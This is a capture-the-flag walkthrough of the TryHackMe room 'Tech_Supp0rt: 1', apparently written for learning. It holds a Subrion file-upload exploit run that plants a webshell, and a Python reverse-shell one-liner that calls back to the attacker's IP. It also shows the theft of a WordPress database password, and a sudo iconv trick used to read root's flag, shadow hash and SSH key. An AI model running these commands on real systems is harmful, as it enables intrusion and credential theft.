> VOiD XD

This is short writup for [Tech_Supp0rt: 1](https://tryhackme.com/room/techsupp0rt1) (Hack into the scammer's under-development website to foil their plans.) on [tryhackme](https://tryhackme.com)
Go check it out.

> Target IP : 168.119.142.36


### Rustscan
Rustscan for quick open ports lookup.

```bash
# All ports scan
rustscan -a 10.10.203.0 -b 1000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 924'.
Open 10.10.203.0:22
Open 10.10.203.0:80
Open 10.10.203.0:139
Open 10.10.203.0:445
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-19 05:30 EDT
Initiating Ping Scan at 05:30
Scanning 10.10.203.0 [2 ports]
Completed Ping Scan at 05:30, 0.20s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 05:30
Completed Parallel DNS resolution of 1 host. at 05:30, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 05:30
Scanning 10.10.203.0 [4 ports]
Discovered open port 80/tcp on 10.10.203.0
Discovered open port 445/tcp on 10.10.203.0
Discovered open port 139/tcp on 10.10.203.0
Discovered open port 22/tcp on 10.10.203.0
Completed Connect Scan at 05:30, 0.29s elapsed (4 total ports)
Nmap scan report for 10.10.203.0
Host is up, received syn-ack (0.24s latency).
Scanned at 2022-04-19 05:30:38 EDT for 1s

PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack
80/tcp  open  http         syn-ack
139/tcp open  netbios-ssn  syn-ack
445/tcp open  microsoft-ds syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.66 seconds
```

## Nmap 
```bash
# Version and Service Scans

nmap -sC -sV -vv 10.10.203.0 -oN scans/init 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-19 05:28 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 05:28
Completed NSE at 05:28, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 05:28
Completed NSE at 05:28, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 05:28
Completed NSE at 05:28, 0.00s elapsed
Initiating Ping Scan at 05:28
Scanning 10.10.203.0 [2 ports]
Completed Ping Scan at 05:28, 0.28s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 05:28
Completed Parallel DNS resolution of 1 host. at 05:28, 0.02s elapsed
Initiating Connect Scan at 05:28
Scanning 10.10.203.0 [1000 ports]
Discovered open port 139/tcp on 10.10.203.0
Discovered open port 445/tcp on 10.10.203.0
Discovered open port 22/tcp on 10.10.203.0
Discovered open port 80/tcp on 10.10.203.0
Increasing send delay for 10.10.203.0 from 0 to 5 due to max_successful_tryno increase to 4
Increasing send delay for 10.10.203.0 from 5 to 10 due to max_successful_tryno increase to 5
Completed Connect Scan at 05:28, 29.82s elapsed (1000 total ports)
Initiating Service scan at 05:28
Scanning 4 services on 10.10.203.0
Completed Service scan at 05:29, 11.82s elapsed (4 services on 1 host)
NSE: Script scanning 10.10.203.0.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 05:29
Completed NSE at 05:29, 9.83s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 05:29
Completed NSE at 05:29, 1.44s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 05:29
Completed NSE at 05:29, 0.00s elapsed
Nmap scan report for 10.10.203.0
Host is up, received syn-ack (0.19s latency).
Scanned at 2022-04-19 05:28:29 EDT for 54s
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE    SERVICE     REASON      VERSION
22/tcp   open     ssh         syn-ack     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 10:8a:f5:72:d7:f9:7e:14:a5:c5:4f:9e:97:8b:3d:58 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCtST3F95eem6k4V02TcUi7/Qtn3WvJGNfqpbE+7EVuN2etoFpihgP5LFK2i/EDbeIAiEPALjtKy3gFMEJ5QDCkglBYt3gUbYv29TQBdx+LZQ8Kjry7W+KCKXhkKJEVnkT5cN6lYZIGAkIAVXacZ/YxWjj+ruSAx07fnNLMkqsMR9VA+8w0L2BsXhzYAwCdWrfRf8CE1UEdJy6WIxRsxIYOk25o9R44KXOWT2F8pP2tFbNcvUMlUY6jGHmXgrIEwDiBHuwd3uG5cVVmxJCCSY6Ygr9Aa12nXmUE5QJE9lisYIPUn9IjbRFb2d2hZE2jQHq3WCGdAls2Bwnn7Rgc7J09
|   256 7f:10:f5:57:41:3c:71:db:b5:5b:db:75:c9:76:30:5c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBClT+wif/EERxNcaeTiny8IrQ5Qn6uEM7QxRlouee7KWHrHXomCB/Bq4gJ95Lx5sRPQJhGOZMLZyQaKPTIaILNQ=
|   256 6b:4c:23:50:6f:36:00:7c:a6:7c:11:73:c1:a8:60:0c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDolvqv0mvkrpBMhzpvuXHjJlRv/vpYhMabXxhkBxOwz
80/tcp   open     http        syn-ack     Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)
139/tcp  open     netbios-ssn syn-ack     Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open     netbios-ssn syn-ack     Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
6792/tcp filtered unknown     no-response
Service Info: Host: TECHSUPPORT; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-04-19T09:29:16
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: techsupport
|   NetBIOS computer name: TECHSUPPORT\x00
|   Domain name: \x00
|   FQDN: techsupport
|_  System time: 2022-04-19T14:59:14+05:30
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 55287/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 30605/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 34806/udp): CLEAN (Timeout)
|   Check 4 (port 30218/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: -1h49m58s, deviation: 3h10m30s, median: 0s

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 05:29
Completed NSE at 05:29, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 05:29
Completed NSE at 05:29, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 05:29
Completed NSE at 05:29, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 54.48 second
```

## PORT 139 [smb]
```bash
# Smb Enumeration
smbclient -L 10.10.203.0
Enter WORKGROUP\kalis password: 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	websvr          Disk      
	IPC$            IPC       IPC Service (TechSupport server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP  


smbclient \\\\10.10.203.0\\websvr
Enter WORKGROUP\kalis password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat May 29 03:17:38 2021
  ..                                  D        0  Sat May 29 03:03:47 2021
  enter.txt                           N      273  Sat May 29 03:17:38 2021

		8460484 blocks of size 1024. 5698820 blocks available


smb: \> get enter.txt
getting file \enter.txt of size 273 as enter.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)


```

```bash
# Reading file we got
cat enter.txt         
GOALS
=====
1)Make fake popup and host it online on Digital Ocean server
2)Fix subrion site, /subrion doesnt work, edit from panel
3)Edit wordpress website

IMP
===
Subrion creds
|->admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk [cooked with magical formula]
Wordpress creds
|->

# Using cyberchef to decode 
7sKvntXdPEJaxazce9PXi24zaFrLiKWCk --> from base58 --> from base32 -->from base64 --> gives Scam2021
```


## PORT 80 [http]
```bash
# Directory Enumeration

gobuster dir --url http://10.10.203.0 --wordlist=/usr/share/wordlists/dirb/common.txt -t 40 | tee go.log
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.203.0
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/04/19 05:43:13 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 11321]
/phpinfo.php          (Status: 200) [Size: 94954]
/server-status        (Status: 403) [Size: 278]  
/test                 (Status: 301) [Size: 313] [--> http://10.10.203.0/test/]
/wordpress            (Status: 301) [Size: 318] [--> http://10.10.203.0/wordpress/]
                                                                                     
===============================================================
2022/04/19 05:43:49 Finished
===============================================================
```

Checking out findings
```bash
# /test
http://10.10.203.0/test/ --> gives sample of the test error page
# nothing important

# /phpinfo.php
10.10.203.0/phpinfo.php  --> gives all the information about the server
CONTEXT_DOCUMENT_ROOT 	/var/www/html 
```

```bash
# Wordpress Enumeration

http://10.10.203.0/wordpress/  --> using wpscan to enumerate

wpscan --url http://10.10.203.0/wordpress/ -P /usr/share/wordlists/rockyou.txt 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.20
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.203.0/wordpress/ [10.10.203.0]
[+] Started: Wed Apr 20 11:39:49 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.203.0/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.203.0/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.10.203.0/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.203.0/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.7.2 identified (Insecure, released on 2021-05-12).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.203.0/wordpress/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.7.2'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.203.0/wordpress/, Match: 'WordPress 5.7.2

[+] WordPress theme in use: teczilla
 | Location: http://10.10.203.0/wordpress/wp-content/themes/teczilla/
 | Last Updated: 2021-11-17T00:00:00.000Z
 | Readme: http://10.10.203.0/wordpress/wp-content/themes/teczilla/readme.txt
 | [!] The version is out of date, the latest version is 1.1.3
 | Style URL: http://10.10.203.0/wordpress/wp-content/themes/teczilla/style.css?ver=5.7.2
 | Style Name: Teczilla
 | Style URI: https://www.avadantathemes.com/product/teczilla-free/
 | Description: Teczilla is a creative, fully customizable and multipurpose theme that you can use to create any kin...
 | Author: avadantathemes
 | Author URI: https://www.avadantathemes.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0.4 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.203.0/wordpress/wp-content/themes/teczilla/style.css?ver=5.7.2, Match: 'Version: 1.0.4'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:06 <===============================================================================================================> (137 / 137) 100.00% Time: 00:00:06

[i] No Config Backups Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:03 <================================================================================================================> (10 / 10) 100.00% Time: 00:00:03

[i] User(s) Identified:

[+] support
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://10.10.203.0/wordpress/index.php/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] Performing password attack on Xmlrpc against 1 user/s
^Cying support / dimple Time: 00:09:27 <                                                                                                             > (1500 / 14344392)  0.01%  ETA: ??:??:??
[i] No Valid Passwords Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.                                                                   > (1504 / 14344392)  0.01%  ETA: ??:??:??
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed Apr 20 11:50:00 2022
[+] Requests Done: 1695
[+] Cached Requests: 7
[+] Data Sent: 859.634 KB
[+] Data Received: 1.442 MB
[+] Memory used: 238.305 MB
[+] Elapsed time: 00:10:11

Scan Aborted: Canceled by User

# Nothing important was found except support user.
```

```
# /subrion

Fix subrion site, /subrion doesnt work, edit from panel

but /subrion redirects us to {our_local_ip}/subrion/subrion

tried to look into burp and all for long time.

guessed /subrion/panel may work.

And it did!

we already have creds

admin:Scam2021

```

```bash
# Subrion enumeration gives

Subrion version 4.2.1 installed. Cheers!

searchsploit  Subrion   
------------------------------------------------------------ ---------------------------------
 Exploit Title                                              |  Path
------------------------------------------------------------ ---------------------------------
Subrion 3.x - Multiple Vulnerabilities                      | php/webapps/38525.txt
Subrion 4.2.1 - 'Email' Persistant Cross-Site Scripting     | php/webapps/47469.txt
Subrion Auto Classifieds - Persistent Cross-Site Scripting  | php/webapps/14391.txt
SUBRION CMS - Multiple Vulnerabilities                      | php/webapps/17390.txt
Subrion CMS 2.2.1 - Cross-Site Request Forgery (Add Admin)  | php/webapps/21267.txt
subrion CMS 2.2.1 - Multiple Vulnerabilities                | php/webapps/22159.txt
Subrion CMS 4.0.5 - Cross-Site Request Forgery (Add Admin)  | php/webapps/47851.txt
Subrion CMS 4.0.5 - Cross-Site Request Forgery Bypass / Per | php/webapps/40553.txt
Subrion CMS 4.0.5 - SQL Injection                           | php/webapps/40202.txt
Subrion CMS 4.2.1 - 'avatar[path]' XSS                      | php/webapps/49346.txt
Subrion CMS 4.2.1 - Arbitrary File Upload                   | php/webapps/49876.py
Subrion CMS 4.2.1 - Cross-Site Scripting                    | php/webapps/45150.txt
------------------------------------------------------------ ---------------------------------
Shellcodes: No Results



searchsploit  -m php/webapps/49876.py
  Exploit: Subrion CMS 4.2.1 - Arbitrary File Upload
      URL: https://www.exploit-db.com/exploits/49876
     Path: /usr/share/exploitdb/exploits/php/webapps/49876.py
File Type: Python script, ASCII text executable, with very long lines (956)

Copied to: /home/kali/TryHackMe/Tech_Support/49876.py

```

```bash
# Gaining Access

┌──(kali㉿kali)-[~/TryHackMe/Tech_Support]
└─$ python3 exploit.py 
[+] Specify an url target
[+] Example usage: exploit.py -u http://target-uri/panel
[+] Example help usage: exploit.py -h
                                                                                              
┌──(kali㉿kali)-[~/TryHackMe/Tech_Support]
└─$ python3 exploit.py -h
Usage: exploit.py [options]

Options:
  -h, --help            show this help message and exit
  -u URL, --url=URL     Base target uri http://target/panel
  -l USER, --user=USER  User credential to login
  -p PASSW, --passw=PASSW
                        Password credential to login
                                                                                              
┌──(kali㉿kali)-[~/TryHackMe/Tech_Support]
└─$ python3 exploit.py -u http://10.10.203.0/subrion/panel/ -l admin -p Scam2021
[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 

[+] Trying to connect to: http://10.10.203.0/subrion/panel/
[+] Success!
[+] Got CSRF token: UiWXFvBttTMBZWjVxBCfNFJsnoX6hxdNrOeMwlvW
[+] Trying to log in...
[+] Login Successful!

[+] Generating random name for Webshell...
[+] Generated webshell name: rlccyhomkqkrtwl

[+] Trying to Upload Webshell..
[+] Upload Success... Webshell path: http://10.10.203.0/subrion/panel/uploads/rlccyhomkqkrtwl.phar 

$ 

Yay we got our shell

Stablizing shell

$ which python3
/usr/bin/python3

$ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.253.221",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## Shell [www-data]
```bash
#  Shell Stablization

┌──(kali㉿kali)-[~/TryHackMe/Tech_Support]
└─$ nc -nlvp 4444                                
listening on [any] 4444 ...
connect to [10.8.253.221] from (UNKNOWN) [10.10.203.0] 41394
/bin/sh: 0: can't access tty; job control turned off

$ python3 -c 'import pty;pty.spawn("/bin/bash")'

www-data@TechSupport:/var/www/html/subrion/uploads$

www-data@TechSupport:/var/www/html/subrion/uploads$ export TERM=xterm
export TERM=xterm

ctrl+z
zsh: suspended  nc -nlvp 4444


┌──(kali㉿kali)-[~/TryHackMe/Tech_Support]
└─$ stty raw -echo;fg       
[1]  + continued  nc -nlvp 4444

www-data@TechSupport:/var/www/html/subrion/uploads$

```

Looking around wordpress site gives this info
```bash
# User Enumeration

www-data@TechSupport:/var/www/html/wordpress$ ls
index.php	 wp-blog-header.php    wp-includes	  wp-settings.php
license.txt	 wp-comments-post.php  wp-links-opml.php  wp-signup.php
readme.html	 wp-config.php	       wp-load.php	  wp-trackback.php
wp-activate.php  wp-content	       wp-login.php	  xmlrpc.php
wp-admin	 wp-cron.php	       wp-mail.php

www-data@TechSupport:/var/www/html/wordpress$ cat wp-config.php

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wpdb' );

/** MySQL database username */
define( 'DB_USER', 'support' );

/** MySQL database password */
define( 'DB_PASSWORD', 'ImAScammerLOL!123!' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );


scamsite@TechSupport:/home$ cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
scamsite:x:1000:1000:scammer,,,:/home/scamsite:/bin/bash

# Gives 2 users root and scamsite

# trying using same creds we got 

www-data@TechSupport:/home$ su scamsite
Password: 
scamsite@TechSupport:/home$ sudo -l
Matching Defaults entries for scamsite on TechSupport:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User scamsite may run the following commands on TechSupport:
    (ALL) NOPASSWD: /usr/bin/iconv


# more info about iconv

scamsite@TechSupport:~/websvr$ /usr/bin/iconv --help
Usage: iconv [OPTION...] [FILE...]
Convert encoding of given files from one encoding to another.

 Input/Output format specification:
  -f, --from-code=NAME       encoding of original text
  -t, --to-code=NAME         encoding for output

 Information:
  -l, --list                 list all known coded character sets

 Output control:
  -c                         omit invalid characters from output
  -o, --output=FILE          output file
  -s, --silent               suppress warnings
      --verbose              print progress information

  -?, --help                 Give this help list
      --usage                Give a short usage message
  -V, --version              Print program version

Mandatory or optional arguments to long options are also mandatory or optional
for any corresponding short options.

For bug reporting instructions, please see:
<https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs>.


# GTFObins give
Sudo

If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

    LFILE=file_to_read
    ./iconv -f 8859_1 -t 8859_1 "$LFILE"


# Lets check it out

scamsite@TechSupport:~$ echo TEST > test.txt

/usr/bin/iconv -f 8859_1 -t 8859_1 ./test.txt
TEST


Getting the root flag

sudo /usr/bin/iconv -f 8859_1 -t 8859_1 /root/root.txt
851b8233a8c0<Check it out youself>9bf1ed02790b

checking for other files

root hash
root:$6$.jnArnoS$vhMAUiCBPWNT/G69DcbUJiD93STewGXfZybhl15/3B2h4H9iuwQVk4o77eHVD5.aDPWQEZgR22FFPvzgsQ/KV1:18775:0:99999:7:::

root id_rsa
sudo /usr/bin/iconv -f 8859_1 -t 8859_1 /root/.ssh/id_rs
Yeah its there !

┌──(kali㉿kali)-[~/TryHackMe/Tech_Support]
└─$ ssh root@10.10.203.0 -i id_rsa
root@10.10.203.0's password: 

but still ask password
```

That all for this room hope you learnt something !
